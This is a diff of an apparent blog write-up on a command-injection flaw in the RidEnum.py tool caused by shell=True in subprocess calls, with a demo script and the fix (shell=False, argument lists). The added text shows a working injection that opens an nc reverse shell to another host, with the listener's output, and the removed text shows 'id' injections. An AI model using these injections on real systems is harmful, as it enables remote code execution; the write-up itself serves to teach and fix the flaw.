@@ -25,9 +25,9 @@ The links above focus more on which a user is prompted to provide input via the 
 ## The Vulnerability
 The vulnerability itself is not super-duper serious as a vast majority of Linux machines will probably not have this tool installed. While working on a CTF problem involving SIDs and looking for another tool to compare with Impacket's lookupsid.py script, I came across a tool written by Dave Kennedy (ReL1K) called RidEnum.py. I was interested in how both tools were obtaining the Domain SID, but that's not really important. However, I noticed in the source code on the [github page](https://github.com/trustedsec/ridenum/blob/master/ridenum.py) that the tool was using a Subprocess.Popen object or two to execute a shell command. This appears on lines 62 and 78. 
 
-There are two arguments that helped me to perform command injection. If you look closely, you'll note that the variable `command` which will store the string representation of the command to be executed takes the `auth` (or optional username argument) and the IP argument and then places them into the string using the "old style" string formatting operator (`%`).
+There is at least one argument that helped me obtain code execution, which was the argument for the rhost's IP address. It also looks like the `auth` argument is a possibility, but I've had no luck with using it. If you look closely, you'll note that the variable `command` which will store the string representation of the command to be executed takes the `auth` (or optional username argument) and the IP argument and then places them into the string using the "old style" string formatting operator (`%`).
 
-Two things can be taken in to consideration at this point (links 3, 4 and 5 above do a great job explaining the problems):
+### Two things can be taken in to consideration at this point (links 3, 4 and 5 above do a great job explaining the problems):
 
 1. The `shell` parameter in both calls are set to `true`. That's a no no, especially if you allow a user to supply input to your script or program. In simple terms, this tells Python to execute the string containing the command(s) as if you were doing it in a bash shell.
 
@@ -44,40 +44,55 @@ As I said before, doing this via command line arguments is a little tricker. One
 
 Let's execute ridenum and inject the bash command `id`.
 ```
-./ridenum.py "1.1.1.1; *nc 192.168.1.126 1234 -c bash;*" 0 3 "0v3rride" "mysecretpassword"
+./ridenum.py "1.1.1.1; nc 192.168.1.126 1234 -c bash;" 0 3 "0v3rride" "mysecretpassword"
 ```
 
-Result (I'm executing this on my Kali machine locally, that's why I'm root):
+Result:
 ```
-uid=0(root) gid=0(root) groups=0(root)
-bash: 100: command not found
-```
-Note the error below the output of the `id` command and how I placed the `id` command with the `IP` argument. Why do I need two `;`? If this were executed as `;id 100 1000 0v3rride` then everything after `id<space>` is treated as an argument to the `id` command. So in this case the error would be `id: extra operand ‘1000’`. One can run the bash command `id` and supply it a username as an argument (`id <username>`). 
-
-Let's get the id information for the account `ntp`.
-```
-./ridenum.py 10.10.10.10;id ntp;100 1000 0v3rride
-
-uid=111(ntp) gid=114(ntp) groups=114(ntp)
-bash: 100: command not found
+listening on [any] 1234 ...
+connect to [192.168.1.126] from (UNKNOWN) [192.168.1.111] 53370
+ls
+CHANGELOG.txt
+LICENSE.txt
+README.md
+ridenum.py
 ```
 
-The injection point for the auth command is even easier. Since ridenum wants you to give arguments in a specified order and everything after the `<end_rid>` argument is optional, you don't need another `;` to terminate. However, you will have to wait for ridenum to run all the way through until it executes the command that was injected. In this case I feed it an invalid IP address so it would execute faster, because it fails.
+Note how I placed the `nc` command with the `IP` argument. Why do I need two `;`? If I don't add another `;` to terminate, it looks like `ridenum.py` trys creating a list of users enumerated during RID cycling, which kills the reverse shell immediately. So placing the second `;` after the `nc` command will keep the reverse shell alive until you exit it.
+
+Command/Shell injection via a Python script is really that simple. The fix to this is also pretty simple. Get rid of the `shell=True` or explicitly use `shell=False`. In addition breaking down the `command` variable down into a list of strings would fix the issue also as this wouldn't treat each subsquent string as an argument to the string in the first indice.
+
+
+## You can play with the following source code below to get a better understanding.
 
 ```
-./ridenum.py 10.10.10.10 100 1000 0v3rride;id
-[*] Attempting lsaquery first...This will enumerate the base domain SID
-[!] Unable to enumerate through lsaquery, trying default account names..
-[!] Failed using account name: administrator...Attempting another.
-[!] Failed using account name: guest...Attempting another.
-[!] Failed using account name: krbtgt...Attempting another.
-[!] Failed using account name: root...Attempting another.
-[!] Failed to enumerate SIDs, pushing on to another method.
-[*] Enumerating user accounts.. This could take a little while.
-[*] Attempting enumdomusers to enumerate users...
-[!] Sorry. RIDENUM failed to successfully enumerate users. Bummers.
-uid=0(root) gid=0(root) groups=0(root)
+import subprocess; 
+ 
+def unsafe_ping(server):
+  return subprocess.check_output('ping -c 1 %s' % server, shell=True);
+
+print(unsafe_ping("8.8.8.8; id").decode("UTF-8"));
+
+
+# def safe_ping(server):
+#     return subprocess.check_output(['ping', '-c', '1', server], shell=False);
+
+# print(safe_ping("8.8.8.8; id").decode("UTF-8"));
+
+
+userinput = input("give some input: ");
+
+print("Test 1: shell=true, string command");
+print(subprocess.check_output("echo {}".format(userinput), shell=True).decode("UTF-8"));
+
+#Command injection doesn't seem to work on any of the below
+
+print("Test 3: shell=true, list of strings");
+print(subprocess.check_output(["echo", "{}".format(userinput)], shell=True).decode("UTF-8"));
+
+print("Test 2: shell=false, string command");
+print(subprocess.check_output("echo {}".format(userinput), shell=False).decode("UTF-8"));
+
+print("Test 4: shell=false, list of strings");
+print(subprocess.check_output(["echo", "{}".format(userinput)], shell=False).decode("UTF-8"));
 ```
-
-Command/Shell injection via a Python script is really that simple. The fix to this is also pretty simple. Get rid of the `shell=true` argument and break the `command` variable down into a list of strings.
-
